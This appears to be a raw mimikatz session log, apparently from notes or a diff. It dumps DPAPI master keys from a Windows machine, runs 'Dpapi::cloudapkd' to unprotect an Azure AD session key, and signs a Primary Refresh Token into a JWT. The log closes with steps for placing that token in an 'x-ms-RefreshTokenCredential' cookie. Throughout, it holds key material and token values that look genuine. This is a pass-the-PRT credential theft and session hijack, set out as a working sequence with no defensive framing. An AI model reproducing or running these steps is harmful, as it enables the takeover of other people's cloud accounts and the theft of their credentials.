+Authentication Id : 0 ; 52146 (00000000:0000cbb2)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:42:53
+SID               : S-1-5-96-0-0
+
+
+Authentication Id : 0 ; 52048 (00000000:0000cb50)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:42:53
+SID               : S-1-5-96-0-1
+
+
+Authentication Id : 0 ; 51002 (00000000:0000c73a)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:42:52
+SID               :
+
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-OHJLG4J$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2023-02-25 15:42:52
+SID               : S-1-5-18
+         [00000000]
+         * GUID      :  {90dc8bb8-5d71-4069-b666-6498c706ccce}
+         * Time      :  2023-02-25 15:47:59
+         * MasterKey :  19098fed7a8152505c1930e735fabea39828b87427b9e22a3bdbcfd941c63f82226c8005e3bd59e972f382aa69ec1a4d08d9154b1ca23fe6338ea25110c98bd9
+         * sha1(key) :  a73c515a6bf8ecd349bdde9baad3d7d14b38d13d
+         [00000001]
+         * GUID      :  {45391ecc-be0b-4b0f-a752-e5d4c1ec7388}
+         * Time      :  2023-02-25 15:43:04
+         * MasterKey :  ea66eeb03958754d0b042837390bc65fab4151bbb4e7a726391edb59435e42549e4c80c0addccabe70c7836c20bf82ca87d7cc2b746741bcee0b56870c9429d8
+         * sha1(key) :  b66724aa42fd6c32fc16623f1d1de82083e3be09
+         [00000002]
+         * GUID      :  {a090e5bb-2ebe-40f8-8050-0d4e44693afb}
+         * Time      :  2023-02-25 15:48:16
+         * MasterKey :  e63d6def294ec43e88b6e1b3bbe7473b296221dc4435e41b1687ec874940ebb151f1b7d79e8d913b38ad42e8c689f7e084911dc3e267f2e8a9a5ccfc3cfd5aba
+         * sha1(key) :  834cf33f2bfd3e4bf9f1017ce33f8b03340ea592
+         [00000003]
+         * GUID      :  {c527dd62-c8ae-417e-8980-f2cf422c867b}
+         * Time      :  2023-02-25 15:45:27
+         * MasterKey :  e5be8745e54d4f32383cf1fc74e8e670b0a37ed81b29eeb8770af63d05444cd108f65150988d3ec50ab37a0378cc33296e416b17641085ea397d61c2a0a45867
+         * sha1(key) :  0e7aa4fe58e3bbcc1418365082b7886e296c1dcc
+         [00000004]
+         * GUID      :  {74fc448a-1963-44fb-8405-8f51f19b03d6}
+         * Time      :  2023-02-25 15:42:53
+         * MasterKey :  1cd0f3a3f3c5c3f4b6703b3ebae620b397e5f0c1671004228d9e44c722bf30f71d5d65d3544f601896b97660f1a1cd68cbc0c4d7f0f099cc683be9dbd0e241a3
+         * sha1(key) :  939ae390cd5b6db1d0053393140c3fd209abd3c9
+
+mimikatz # Dpapi::cloudapkd /keyvalue:AQAAAAEAAAABAAAA0Iyd3wEV0RGMegDAT8KX6wEAAAC75ZCgvi74QIBQDU5EaTr7AAAAAAIAAAAAABBmAAAAAQAAIAAAAGHGirViwObITql0SjjcA1eIFoS0ulTs6F7sqq0GxstAAAAAAA6AAAAAAgAAIAAAAPojzaORjxlt6Tik1YUBOB4GY6IUJlgZ8Cv9baAX8tFrMAAAAK4kPmx-1cYp0_S8Yxsn4aK93mWkjM3Ug1kxlmomCmiyH43uh1pNdwJAY9eaA1T-xEAAAACSQ34kV8F1o82SEdj4_RLKT6e2YiDtnrRk8LWNYL9Fqe3lK9knWgNifW2RSWnS8ox_syFpqTEenzQXd7LKu9I8 /masterkey:c2f68579bda6079c77e03a06977cfdca9759712b4e519e9a73cadd2405da99f4154b60ad49000f705ce19a3f6b16205e08b4f92f2c2cba047d69174adfaacf06 /unprotect
+Label      : AzureAD-SecureConversation
+Context    : 13dd7efdbe9e352da77d99e60d782f6865fb88199f59f0b4
+ * using CryptUnprotectData API
+ * volatile cache: GUID:{a090e5bb-2ebe-40f8-8050-0d4e44693afb};KeyHash:834cf33f2bfd3e4bf9f1017ce33f8b03340ea592;Key:available
+ * masterkey     : c2f68579bda6079c77e03a06977cfdca9759712b4e519e9a73cadd2405da99f4154b60ad49000f705ce19a3f6b16205e08b4f92f2c2cba047d69174adfaacf06
+Key type   : Software (DPAPI)
+Clear key  : 5691b338b65235c0110add30902d14ed8be9b91ffaf8ce9813a535d0fc9b8b8f
+Derived Key: ec7fd380e3dcc158e1f86dbd05c9c5eed37ccc62065a5fe76aaf0a191443b063
+
+mimikatz # Dpapi::cloudapkd /context:13dd7efdbe9e352da77d99e60d782f6865fb88199f59f0b4 /derivedkey:ec7fd380e3dcc158e1f86dbd05c9c5eed37ccc62065a5fe76aaf0a191443b063 /Prt:MC5BVTRBTjVXbXlHM0YzRTY4bm9WbDd2OUJRb2M3cWpodG9CZElzblY2TVdtSTJUdURBTUkuQWdBQkFBRUFBQUQtLURMQTNWTzdRcmRkZ0pnN1dldnJBZ0RzX3dVQTlQODVwZm01ZERkQ2dXVDBaUFJ5LTJEYUhNTnc2UkItUFRwSldWZjA5MG13Yk5aTE1lWkRJb253MWdIRGtoanhZVlhmdU1xU3NvMGFTemtBZGluZXVma1U4QklRbXNoYy13NVBxNmQydDhud0ZZdVQySHRQWHVUUDJXdHRoTk5mTHFpNEJpLTI5Y2JRZEZyd0ktNy16c096NmR3YWRqdUlIQWxHbDJvNHlmUnlscElBN3NnSXoxR1VlV3BYNUJzNUQ3WTlyLW9mZmxjRy1JX1hFOFIwODE5bjIwZDVDeldldW80Y0NKTk1Ja01uYnNMYUhXVDlvMmppRGx4VmhHZkQ2LWJKYTF0TTYzTTRVQk1ZNE1vRlVndWxyLXFlY0pPaGZ5YTdsemhQbjZTamowM2h2ODZ5VlRDV0lxODlRVEFtZlhldVUwZll4NzluUTVVSF9RaGNaR2ZTSHlRdEhzV3dhb3dXZGdlY3RiOGxmdmtBUVpvTHFQQS0wV2p1MDE4YXU0d1VKcl8yVS1nRHlsU09mS0h1N0FqdGMxUzRFWHhwVHZBbEVYTjUwbW9NdlRQNEE0aThFV2tESWRJdXVVekRLWDNiU1I3WmE3Ukwtbzc5X3ZGZ0JrMXVTclFKYld3SGJEMDNqd2d1Q29uQ0xwSFF3OExueVU2V0Z2XzdHY05hN0ZDQ2JTTHpXNGJFbVduRlFVcGtzankwanM1d1pobTh4US1ZdU9UWlpaMmFlN01ab2Q3X0JJOFNTb0VMeXVHd3U0c2hqSk9sWXljN2pzb3p1Yk5LRG1OcEtvckh0aWR2ZVhkbUl1d3ppd0FlUmNnWnpWSG9JMk92T2dTRnFSQlhpVHNHSXJxTFJibUJ1VGZSbi0wV3p1a0c0UjUtdDdXRmZaSGV6MW9tT0xRem1aTmZzT1lETldpVWpmZnNacEU4WEt6R3pOZ2s5cU5FbGpUNS1JZk1ia0JMQlJMV0tsTTBRNW5CX2FNNnR5QjUtdTItZkI2MXBwdmp2SldOQnc3U2hvWWd3TmRxUFVwMEtjaXBZSlRhMUZVRUNWSVhJRlV2dkRWUHN6R0RIRnRUWW5sYjRfV25rU0dmbzBTY2VuRFFDak13S0p5ZGJYRElwQTRncVo2YjJTS3JxdDlGUjhIR3k5N29BVE1yTDBsSFlkRUJtMUVSRGFvZHIwUnJURk1mandCb3Q3ckpFd2VUSkFEZGYzdHdTU0tidFllWENtRGQ0MkJlOU5nZElIbEhIRmpCbEI2c25aNFl6N1dSRWRLaUpBRVJSdk1kMFVEQzlGODhKN09VdFE
+Label      : AzureAD-SecureConversation
+Context    : 13dd7efdbe9e352da77d99e60d782f6865fb88199f59f0b4
+Derived Key: ec7fd380e3dcc158e1f86dbd05c9c5eed37ccc62065a5fe76aaf0a191443b063
+Issued at  : 0
+
+Signature with key:
+eyJhbGciOiJIUzI1NiIsICJjdHgiOiJFOTErXC9iNmVOUzJuZlpubURYZ3ZhR1g3aUJtZldmQzAifQ.eyJyZWZyZXNoX3Rva2VuIjoiMC5BVTRBTjVXbXlHM0YzRTY4bm9WbDd2OUJRb2M3cWpodG9CZElzblY2TVdtSTJUdURBTUkuQWdBQkFBRUFBQUQtLURMQTNWTzdRcmRkZ0pnN1dldnJBZ0RzX3dVQTlQODVwZm01ZERkQ2dXVDBaUFJ5LTJEYUhNTnc2UkItUFRwSldWZjA5MG13Yk5aTE1lWkRJb253MWdIRGtoanhZVlhmdU1xU3NvMGFTemtBZGluZXVma1U4QklRbXNoYy13NVBxNmQydDhud0ZZdVQySHRQWHVUUDJXdHRoTk5mTHFpNEJpLTI5Y2JRZEZyd0ktNy16c096NmR3YWRqdUlIQWxHbDJvNHlmUnlscElBN3NnSXoxR1VlV3BYNUJzNUQ3WTlyLW9mZmxjRy1JX1hFOFIwODE5bjIwZDVDeldldW80Y0NKTk1Ja01uYnNMYUhXVDlvMmppRGx4VmhHZkQ2LWJKYTF0TTYzTTRVQk1ZNE1vRlVndWxyLXFlY0pPaGZ5YTdsemhQbjZTamowM2h2ODZ5VlRDV0lxODlRVEFtZlhldVUwZll4NzluUTVVSF9RaGNaR2ZTSHlRdEhzV3dhb3dXZGdlY3RiOGxmdmtBUVpvTHFQQS0wV2p1MDE4YXU0d1VKcl8yVS1nRHlsU09mS0h1N0FqdGMxUzRFWHhwVHZBbEVYTjUwbW9NdlRQNEE0aThFV2tESWRJdXVVekRLWDNiU1I3WmE3Ukwtbzc5X3ZGZ0JrMXVTclFKYld3SGJEMDNqd2d1Q29uQ0xwSFF3OExueVU2V0Z2XzdHY05hN0ZDQ2JTTHpXNGJFbVduRlFVcGtzankwanM1d1pobTh4US1ZdU9UWlpaMmFlN01ab2Q3X0JJOFNTb0VMeXVHd3U0c2hqSk9sWXljN2pzb3p1Yk5LRG1OcEtvckh0aWR2ZVhkbUl1d3ppd0FlUmNnWnpWSG9JMk92T2dTRnFSQlhpVHNHSXJxTFJibUJ1VGZSbi0wV3p1a0c0UjUtdDdXRmZaSGV6MW9tT0xRem1aTmZzT1lETldpVWpmZnNacEU4WEt6R3pOZ2s5cU5FbGpUNS1JZk1ia0JMQlJMV0tsTTBRNW5CX2FNNnR5QjUtdTItZkI2MXBwdmp2SldOQnc3U2hvWWd3TmRxUFVwMEtjaXBZSlRhMUZVRUNWSVhJRlV2dkRWUHN6R0RIRnRUWW5sYjRfV25rU0dmbzBTY2VuRFFDak13S0p5ZGJYRElwQTRncVo2YjJTS3JxdDlGUjhIR3k5N29BVE1yTDBsSFlkRUJtMUVSRGFvZHIwUnJURk1mandCb3Q3ckpFd2VUSkFEZGYzdHdTU0tidFllWENtRGQ0MkJlOU5nZElIbEhIRmpCbEI2c25aNFl6N1dSRWRLaUpBRVJSdk1kMFVEQzlGODhKN09VdFEiLCAiaXNfcHJpbWFyeSI6InRydWUiLCAiaWF0IjoiMCJ9.ksvjRW5kriHLGvgHXqcGXnpNykiMebm5sEUrRQvIVfY
+
+(for x-ms-RefreshTokenCredential cookie by eg.)
+
+----
+
+
+Name: x-ms-RefreshTokenCredential
+Value: [Paste your output from above]
+HttpOnly: Set to True (checked)
